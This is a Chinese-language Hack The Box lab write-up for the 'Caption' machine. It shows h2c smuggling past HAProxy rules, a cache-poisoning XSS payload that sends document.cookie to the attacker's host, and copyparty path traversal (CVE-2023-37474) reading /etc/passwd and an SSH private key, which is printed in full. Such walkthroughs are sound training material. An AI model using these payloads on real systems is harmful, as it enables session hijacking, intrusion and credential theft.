---
title: Caption
---

# 端口扫描
~~~
┌──(kali㉿kali)-[~/htb/Caption]
└─$ sudo nmap -sT --min-rate 2000 -p- 10.10.11.33 -oA nmap/ports
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-04 01:19 EST
Nmap scan report for 10.10.11.33
Host is up (0.084s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 31.35 seconds

~~~

~~~
┌──(kali㉿kali)-[~/htb/Caption]
└─$ sudo nmap -sT -sV -sC -p 22,80,8080 10.10.11.33 -oA nmap/sC
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-04 01:24 EST
Nmap scan report for 10.10.11.33
Host is up (0.096s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http
|_http-title: Did not follow redirect to http://caption.htb
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, X11Probe: 
|     HTTP/1.1 400 Bad request
|     Content-length: 90
|     Cache-Control: no-cache
|     Connection: close
|     Content-Type: text/html
|     <html><body><h1>400 Bad request</h1>
|     Your browser sent an invalid request.
|     </body></html>
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.1 301 Moved Permanently
|     content-length: 0
|     location: http://caption.htb
|_    connection: close
8080/tcp open  http-proxy
|_http-title: GitBucket
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Tue, 04 Feb 2025 06:08:24 GMT
|     Set-Cookie: JSESSIONID=node01ogdbk76eiif511sgfgywzbfzn2.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 5916
|     <!DOCTYPE html>
|     <html prefix="og: http://ogp.me/ns#" lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <title>Error</title>
|     <meta property="og:title" content="Error" />
|     <meta property="og:type" content="object" />
|     <meta property="og:url" content="http://10.10.11.33:8080/nice%20ports%2C/Tri%6Eity.txt%2ebak" />
|     <meta property="og:image" content="http://10.10.11.33:8080/assets/common/images/gitbucket_ogp.png" />
|     <link rel="icon" href="/assets/common/images/g
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 04 Feb 2025 06:08:22 GMT
|     Set-Cookie: JSESSIONID=node01ufgyr14wanbx1a4f408ns7jrj0.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 8628
|     <!DOCTYPE html>
|     <html prefix="og: http://ogp.me/ns#" lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <title>GitBucket</title>
|     <meta property="og:title" content="GitBucket" />
|     <meta property="og:type" content="object" />
|     <meta property="og:url" content="http://10.10.11.33:8080/" />
|     <meta property="og:image" content="http://10.10.11.33:8080/assets/common/images/gitbucket_ogp.png" />
|     <link rel="icon" href="/assets/common/images/gitbucket.png?20250204060823" type=
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Tue, 04 Feb 2025 06:08:23 GMT
|     Set-Cookie: JSESSIONID=node0811db1i4w69t15iqwb39zm0471.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|_    <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.94SVN%I=7%D=2/4%Time=67A1B2B4%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,66,"HTTP/1\.1\x20301\x20Moved\x20Permanently\r\ncontent-length
SF::\x200\r\nlocation:\x20http://caption\.htb\r\nconnection:\x20close\r\n\
SF:r\n")%r(HTTPOptions,66,"HTTP/1\.1\x20301\x20Moved\x20Permanently\r\ncon
SF:tent-length:\x200\r\nlocation:\x20http://caption\.htb\r\nconnection:\x2
SF:0close\r\n\r\n")%r(RTSPRequest,CF,"HTTP/1\.1\x20400\x20Bad\x20request\r
SF:\nContent-length:\x2090\r\nCache-Control:\x20no-cache\r\nConnection:\x2
SF:0close\r\nContent-Type:\x20text/html\r\n\r\n<html><body><h1>400\x20Bad\
SF:x20request</h1>\nYour\x20browser\x20sent\x20an\x20invalid\x20request\.\
SF:n</body></html>\n")%r(X11Probe,CF,"HTTP/1\.1\x20400\x20Bad\x20request\r
SF:\nContent-length:\x2090\r\nCache-Control:\x20no-cache\r\nConnection:\x2
SF:0close\r\nContent-Type:\x20text/html\r\n\r\n<html><body><h1>400\x20Bad\
SF:x20request</h1>\nYour\x20browser\x20sent\x20an\x20invalid\x20request\.\
SF:n</body></html>\n")%r(FourOhFourRequest,66,"HTTP/1\.1\x20301\x20Moved\x
SF:20Permanently\r\ncontent-length:\x200\r\nlocation:\x20http://caption\.h
SF:tb\r\nconnection:\x20close\r\n\r\n")%r(RPCCheck,CF,"HTTP/1\.1\x20400\x2
SF:0Bad\x20request\r\nContent-length:\x2090\r\nCache-Control:\x20no-cache\
SF:r\nConnection:\x20close\r\nContent-Type:\x20text/html\r\n\r\n<html><bod
SF:y><h1>400\x20Bad\x20request</h1>\nYour\x20browser\x20sent\x20an\x20inva
SF:lid\x20request\.\n</body></html>\n")%r(DNSVersionBindReqTCP,CF,"HTTP/1\
SF:.1\x20400\x20Bad\x20request\r\nContent-length:\x2090\r\nCache-Control:\
SF:x20no-cache\r\nConnection:\x20close\r\nContent-Type:\x20text/html\r\n\r
SF:\n<html><body><h1>400\x20Bad\x20request</h1>\nYour\x20browser\x20sent\x
SF:20an\x20invalid\x20request\.\n</body></html>\n")%r(DNSStatusRequestTCP,
SF:CF,"HTTP/1\.1\x20400\x20Bad\x20request\r\nContent-length:\x2090\r\nCach
SF:e-Control:\x20no-cache\r\nConnection:\x20close\r\nContent-Type:\x20text
SF:/html\r\n\r\n<html><body><h1>400\x20Bad\x20request</h1>\nYour\x20browse
SF:r\x20sent\x20an\x20invalid\x20request\.\n</body></html>\n")%r(Help,CF,"
SF:HTTP/1\.1\x20400\x20Bad\x20request\r\nContent-length:\x2090\r\nCache-Co
SF:ntrol:\x20no-cache\r\nConnection:\x20close\r\nContent-Type:\x20text/htm
SF:l\r\n\r\n<html><body><h1>400\x20Bad\x20request</h1>\nYour\x20browser\x2
SF:0sent\x20an\x20invalid\x20request\.\n</body></html>\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8080-TCP:V=7.94SVN%I=7%D=2/4%Time=67A1B2B4%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,14B8,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2004\x20Feb\x
SF:202025\x2006:08:22\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node01ufgyr14wan
SF:bx1a4f408ns7jrj0\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x20
SF:01\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/html;char
SF:set=utf-8\r\nContent-Length:\x208628\r\n\r\n<!DOCTYPE\x20html>\n<html\x
SF:20prefix=\"og:\x20http://ogp\.me/ns#\"\x20lang=\"en\">\n\x20\x20<head>\
SF:n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\"\x20/>\n\x20\x20\x20\x20<met
SF:a\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scal
SF:e=1\.0,\x20maximum-scale=5\.0\"\x20/>\n\x20\x20\x20\x20<meta\x20http-eq
SF:uiv=\"X-UA-Compatible\"\x20content=\"IE=edge\"\x20/>\n\x20\x20\x20\x20<
SF:title>GitBucket</title>\n\x20\x20\x20\x20<meta\x20property=\"og:title\"
SF:\x20content=\"GitBucket\"\x20/>\n\x20\x20\x20\x20<meta\x20property=\"og
SF::type\"\x20content=\"object\"\x20/>\n\x20\x20\x20\x20<meta\x20property=
SF:\"og:url\"\x20content=\"http://10\.10\.11\.33:8080/\"\x20/>\n\x20\x20\x
SF:20\x20\n\x20\x20\x20\x20\x20\x20<meta\x20property=\"og:image\"\x20conte
SF:nt=\"http://10\.10\.11\.33:8080/assets/common/images/gitbucket_ogp\.png
SF:\"\x20/>\n\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<link\x20
SF:rel=\"icon\"\x20href=\"/assets/common/images/gitbucket\.png\?2025020406
SF:0823\"\x20type=")%r(HTTPOptions,108,"HTTP/1\.1\x20200\x20OK\r\nDate:\x2
SF:0Tue,\x2004\x20Feb\x202025\x2006:08:23\x20GMT\r\nSet-Cookie:\x20JSESSIO
SF:NID=node0811db1i4w69t15iqwb39zm0471\.node0;\x20Path=/;\x20HttpOnly\r\nE
SF:xpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type
SF::\x20text/html;charset=utf-8\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\nCont
SF:ent-Length:\x200\r\n\r\n")%r(RTSPRequest,B8,"HTTP/1\.1\x20505\x20HTTP\x
SF:20Version\x20Not\x20Supported\r\nContent-Type:\x20text/html;charset=iso
SF:-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad
SF:\x20Message\x20505</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(Fou
SF:rOhFourRequest,14B8,"HTTP/1\.1\x20404\x20Not\x20Found\r\nDate:\x20Tue,\
SF:x2004\x20Feb\x202025\x2006:08:24\x20GMT\r\nSet-Cookie:\x20JSESSIONID=no
SF:de01ogdbk76eiif511sgfgywzbfzn2\.node0;\x20Path=/;\x20HttpOnly\r\nExpire
SF:s:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20
SF:text/html;charset=utf-8\r\nContent-Length:\x205916\r\n\r\n<!DOCTYPE\x20
SF:html>\n<html\x20prefix=\"og:\x20http://ogp\.me/ns#\"\x20lang=\"en\">\n\
SF:x20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\"\x20/>\n\x20\x
SF:20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x
SF:20initial-scale=1\.0,\x20maximum-scale=5\.0\"\x20/>\n\x20\x20\x20\x20<m
SF:eta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=edge\"\x20/>\n\x2
SF:0\x20\x20\x20<title>Error</title>\n\x20\x20\x20\x20<meta\x20property=\"
SF:og:title\"\x20content=\"Error\"\x20/>\n\x20\x20\x20\x20<meta\x20propert
SF:y=\"og:type\"\x20content=\"object\"\x20/>\n\x20\x20\x20\x20<meta\x20pro
SF:perty=\"og:url\"\x20content=\"http://10\.10\.11\.33:8080/nice%20ports%2
SF:C/Tri%6Eity\.txt%2ebak\"\x20/>\n\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\
SF:x20<meta\x20property=\"og:image\"\x20content=\"http://10\.10\.11\.33:80
SF:80/assets/common/images/gitbucket_ogp\.png\"\x20/>\n\x20\x20\x20\x20\n\
SF:x20\x20\x20\x20\n\x20\x20\x20\x20<link\x20rel=\"icon\"\x20href=\"/asset
SF:s/common/images/g");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.55 seconds

~~~

~~~
┌──(kali㉿kali)-[~/htb/Caption]
└─$ cat nmap/vuln.nmap 
# Nmap 7.94SVN scan initiated Tue Feb  4 01:25:14 2025 as: /usr/lib/nmap/nmap -sT --script=vuln -p 22,80,8080 -oA nmap/vuln 10.10.11.33
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.11.33
Host is up (0.087s latency).

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
8080/tcp open  http-proxy
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750

# Nmap done at Tue Feb  4 01:28:17 2025 -- 1 IP address (1 host up) scanned in 182.59 seconds

~~~

# 80
是一个简单的登录框，尝试几组弱口令失败
![](Pasted%20image%2020250205105700.png)
# 8000
8000端口扫出/root
查找commit记录发现一组凭据 
margo:vFr&cS2#0!
![](Pasted%20image%2020250204162344.png)

利用凭据登录80端口的服务

![](Pasted%20image%2020250205104939.png)

分析一下项目结构
前端用haproxy转发流量到varnish缓存服务器，然后varnish再发送到后端服务器

![](Pasted%20image%2020250205105917.png)

查看haproxy的配置文件
将80端口的流量转发到6081端口

![](Pasted%20image%2020250205111123.png)

查看varnish的配置文件
后端服务器的端口是8000，大概率是flask？

![](Pasted%20image%2020250205111509.png)

发现正在监听6081端口，同时启用了http2支持

![](Pasted%20image%2020250205111715.png)

前后端http版本不一致可能会造成h2c走私漏洞

haproxy中同时规定了不允许访问/logs和/download目录，可以尝试h2c走私
~~~
frontend http_front
   bind *:80
   default_backend http_back
   acl multi_slash path_reg -i ^/[/%]+
   http-request deny if multi_slash
   acl restricted_page path_beg,url_dec -i /logs
   acl restricted_page path_beg,url_dec -i /download
   http-request deny if restricted_page
   acl not_caption hdr_beg(host) -i caption.htb
   http-request redirect code 301 location http://caption.htb if !not_caption
~~~

使用h2csmuggler检测，发现易受攻击

~~~
┌──(kali㉿kali)-[~/htb/Caption/h2csmuggler]
└─$ python h2csmuggler.py -x  http://caption.htb --test                    
[INFO] h2c stream established successfully.
[INFO] Success! http://caption.htb can be used for tunneling

~~~

那我们尝试访问logs和download

全都返回302而不是403，说明成功绕过，但是身份验证应该没有通过，尝试携带margo的cookie，但还是返回302

~~~
python h2csmuggler.py -x http://caption.htb http://caption.htb/download  -H "Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im1hcmdvIiwiZXhwIjoxNzM4NzI0NDc2fQ.U0u3DFgePdiwW11WF06ydfFpISVGZJiDJEscyW5bv9Q"
~~~

查看访问/home界面的网络请求，有一个传递utm_source的过程

![](Pasted%20image%2020250205120601.png)

分析一下数据包，这里返回的source可能是显示来源

![](Pasted%20image%2020250205120756.png)

尝试添加请求头更改来源
尝试了X-Fowwarded-For和X-Fowwarded-Host，发现会返回X-Fowwarded-Host的内容，因为这里返回的x-cache是miss，说明访问的是后端服务器，尝试利用XSS读取cookie

![](Pasted%20image%2020250205120935.png)

闭合一下script

~~~
X-Forwarded-Host:"></script><script src=http://10.10.16.4/test.xss>123
~~~

然后在burp里点击render从而加载脚本

在本地收到回应
~~~
┌──(kali㉿kali)-[~/htb/Caption]
└─$ php -S 0:80     
[Tue Feb  4 23:40:40 2025] PHP 8.2.24 Development Server (http://0:80) started
[Tue Feb  4 23:41:26 2025] 10.10.16.4:55552 Accepted
[Tue Feb  4 23:41:26 2025] 10.10.16.4:55552 [404]: GET /test.xss - No such file or directory
[Tue Feb  4 23:41:26 2025] 10.10.16.4:55552 Closing
~~~

接下来要做的是让其他用户触发脚本，这需要存储型xss
由于firewalls访问的时候age会增加，这个字符代表缓存已经存在的时间，最高为127，大概为两分钟，我们只要把触发脚本固定在这个缓存界面上即可

在访问firewalls时添加X-Forwarded-Host头，可以看到收到回应

![](Pasted%20image%2020250205125401.png)

然后再次发送一个不带X-Forwarded-Host的请求，发现之前注入的脚本还在页面中
。说明可以成功存储


![](Pasted%20image%2020250205125532.png)

试一下固定一个获取cookie然后发送给我们的脚本

~~~js
<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>
~~~

~~~
X-Forwarded-Host:"></script><script>fetch("http://10.10.16.4/?"+document.cookie);</script><script src=lizi"
~~~

成功注入

![](Pasted%20image%2020250205125751.png)

在本地收到cookie

~~~
┌──(kali㉿kali)-[~/htb/Caption]
└─$ python2 -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.11.33 - - [05/Feb/2025 00:24:14] code 404, message File not found
10.10.11.33 - - [05/Feb/2025 00:24:14] "GET /b.txt HTTP/1.1" 404 -
10.10.11.33 - - [05/Feb/2025 00:24:14] code 404, message File not found
10.10.11.33 - - [05/Feb/2025 00:24:14] "GET /b.txt HTTP/1.1" 404 -
10.10.11.33 - - [05/Feb/2025 00:24:15] code 404, message File not found
10.10.11.33 - - [05/Feb/2025 00:24:15] "GET /b.txt HTTP/1.1" 404 -
10.10.11.33 - - [05/Feb/2025 00:32:55] code 404, message File not found
10.10.11.33 - - [05/Feb/2025 00:32:55] "GET /b.txt HTTP/1.1" 404 -
10.10.11.33 - - [05/Feb/2025 00:32:55] "GET /?session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzM4NzM2MTU5fQ.zd2ShTTLQ9FalyUBPZC714ASw-RbDeuMQ4L_frFPDXg HTTP/1.1" 200 -
10.10.11.33 - - [05/Feb/2025 00:32:55] code 404, message File not found
10.10.11.33 - - [05/Feb/2025 00:32:55] "GET /b.txt HTTP/1.1" 404 -
10.10.11.33 - - [05/Feb/2025 00:32:56] code 404, message File not found
10.10.11.33 - - [05/Feb/2025 00:32:56] "GET /b.txt HTTP/1.1" 404 -
10.10.11.33 - - [05/Feb/2025 00:32:56] "GET /?session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzM4NzM2MTU5fQ.zd2ShTTLQ9FalyUBPZC714ASw-RbDeuMQ4L_frFPDXg HTTP/1.1" 200 -
10.10.16.4 - - [05/Feb/2025 00:35:01] "GET /?session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im1hcmdvIiwiZXhwIjoxNzM4NzM0NTkyfQ.LWsky-vMB-vlALeb71sXnqdEPIVwkDdqjNqLZXq47Zs HTTP/1.1" 200 -
10.10.16.4 - - [05/Feb/2025 00:35:01] "GET /?session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im1hcmdvIiwiZXhwIjoxNzM4NzM0NTkyfQ.LWsky-vMB-vlALeb71sXnqdEPIVwkDdqjNqLZXq47Zs HTTP/1.1" 200 -
10.10.16.4 - - [05/Feb/2025 00:35:01] "GET /?session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im1hcmdvIiwiZXhwIjoxNzM4NzM0NTkyfQ.LWsky-vMB-vlALeb71sXnqdEPIVwkDdqjNqLZXq47Zs HTTP/1.1" 200 -
10.10.11.33 - - [05/Feb/2025 00:35:22] "GET /?session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzM4NzM2MzA2fQ.zH8GKaNRAFB5MTbK5H6D_PDjgOSXk0CUyUy6sMCSZDg HTTP/1.1" 200 -

~~~

再用之前的脚本进行请求，这里注意Cookie:[空格]session=。。。

~~~
┌──(kali㉿kali)-[~/htb/Caption/h2csmuggler]
└─$ python h2csmuggler.py -x http://caption.htb http://caption.htb/logs  -H 'Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzM4NzM2NjQwfQ.55sS4JeNi048Tcmtr4W0KCqGn8daUvxsYKL9YXQv2tY'

~~~

这次访问成功了，发现了几个download地址

~~~
<header class="container my-4">
    <div class="row">
      <!-- vai ocupar todo o espaço se a tela for pequena -->
      <!-- col-lg-6 para telas grandes -->
       
        <center><h1>Log Management</h1></center>
        <br/><br/><center>
        <ul>
            <li><a href="/download?url=http://127.0.0.1:3923/ssh_logs">SSH Logs</a></li>
            <li><a href="/download?url=http://127.0.0.1:3923/fw_logs">Firewall Logs</a></li>
            <li><a href="/download?url=http://127.0.0.1:3923/zk_logs">Zookeeper Logs</a></li>
            <li><a href="/download?url=http://127.0.0.1:3923/hadoop_logs">Hadoop Logs</a></li>
        </ul></center>
      </div>
    </div>
  </header>

~~~

查看了一下没发现什么特殊文件，试一下读取/etc/passwd

~~~
┌──(kali㉿kali)-[~/htb/Caption/h2csmuggler]
└─$ python h2csmuggler.py -x http://caption.htb http://caption.htb//download?url=http://127.0.0.1:3923/../../../../../../../etc/passwd  -H 'Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzM4NzM2NjQwfQ.55sS4JeNi048Tcmtr4W0KCqGn8daUvxsYKL9YXQv2tY'
~~~

返回了copyparty的报错页面，试试找exp

![](Pasted%20image%2020250205140131.png)


找到相关cve  CVE-2023-37474

~~~
┌──(kali㉿kali)-[~/htb/Caption/h2csmuggler]
└─$ cat 51636.txt 
# Exploit Title: copyparty 1.8.2 - Directory Traversal
# Date: 14/07/2023
# Exploit Author: Vartamtzidis Theodoros (@TheHackyDog)
# Vendor Homepage: https://github.com/9001/copyparty/
# Software Link: https://github.com/9001/copyparty/releases/tag/v1.8.2
# Version: <=1.8.2
# Tested on: Debian Linux
# CVE : CVE-2023-37474




#Description
Copyparty is a portable file server. Versions prior to 1.8.2 are subject to a path traversal vulnerability detected in the `.cpr` subfolder. The Path Traversal attack technique allows an attacker access to files, directories, and commands that reside outside the web document root directory.

#POC
curl -i -s -k -X  GET 'http://127.0.0.1:3923/.cpr/%2Fetc%2Fpasswd'   
~~~

这里由于经过了层代理，可能有多次url解码，所以要编码两次

~~~
┌──(kali㉿kali)-[~/htb/Caption/h2csmuggler]
└─$ python h2csmuggler.py -x http://caption.htb http://caption.htb//download?url=http://127.0.0.1:3923/.cpr/%252Fetc%252Fpasswd  -H 'Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzM4NzQxMTAxfQ.sjRrFoMq81nhtFVat6CWogZ2UbJpfIyRig4mngQ3qqY'

~~~

收到回应

~~~
root:x:0:0:root:/root:/bin/bash                                                                                                                                                                                                             
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                                                                                                                                                                             
bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                                                                                                                                                                        
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false 
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
haproxy:x:114:120::/var/lib/haproxy:/usr/sbin/nologin
varnish:x:115:121::/nonexistent:/usr/sbin/nologin
vcache:x:116:121::/nonexistent:/usr/sbin/nologin
varnishlog:x:117:121::/nonexistent:/usr/sbin/nologin
margo:x:1000:1000:,,,:/home/margo:/bin/bash
ruth:x:1001:1001:,,,:/home/ruth:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false

~~~

尝试读取margo的ssh私钥

~~~
┌──(kali㉿kali)-[~/htb/Caption/h2csmuggler]
└─$ python h2csmuggler.py -x http://caption.htb http://caption.htb//download?url=http://127.0.0.1:3923/.cpr/%252Fhome%252Fmargo%252F.ssh%252Fauthorized_keys  -H 'Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzM4NzQxMTAxfQ.sjRrFoMq81nhtFVat6CWogZ2UbJpfIyRig4mngQ3qqY'

~~~

得到公钥，发现使用的是ecdsa加密而不是rsa

~~~
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMY5d7Gy+8OLp5/fgComuWw4o/dzKex6KnS1f9H4Dnz2xKQSvNQ4Q4ltrsbUSnZNrBMlNtZvYpE5is5gsDTPKxA= margo@caption
~~~

得到私钥

~~~
┌──(kali㉿kali)-[~/htb/Caption/h2csmuggler]
└─$ python h2csmuggler.py -x http://caption.htb http://caption.htb//download?url=http://127.0.0.1:3923/.cpr/%252Fhome%252Fmargo%252F.ssh%252Fid_ecdsa  -H 'Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzM4NzQxMTAxfQ.sjRrFoMq81nhtFVat6CWogZ2UbJpfIyRig4mngQ3qqY'

~~~

~~~
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS1zaGEy
LW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQTGOXexsvvDi6ef34AqJrlsOKP3cynseip0tX/R+A58
9sSkErzUOEOJba7G1Ep2TawTJTbWb2KROYrOYLA0zysQAAAAoJxnaNicZ2jYAAAAE2VjZHNhLXNo
YTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMY5d7Gy+8OLp5/fgComuWw4o/dzKex6KnS1f9H4
Dnz2xKQSvNQ4Q4ltrsbUSnZNrBMlNtZvYpE5is5gsDTPKxAAAAAgaNaOfcgjzxxq/7lNizdKUj2u
Zpid9tR/6oub8Y3Jh3cAAAAAAQIDBAUGBwg=
-----END OPENSSH PRIVATE KEY-----
~~~


成功拿到margo的shell
~~~
┌──(kali㉿kali)-[~/htb/Caption]
└─$ ssh margo@10.10.11.33 -i id_rsa
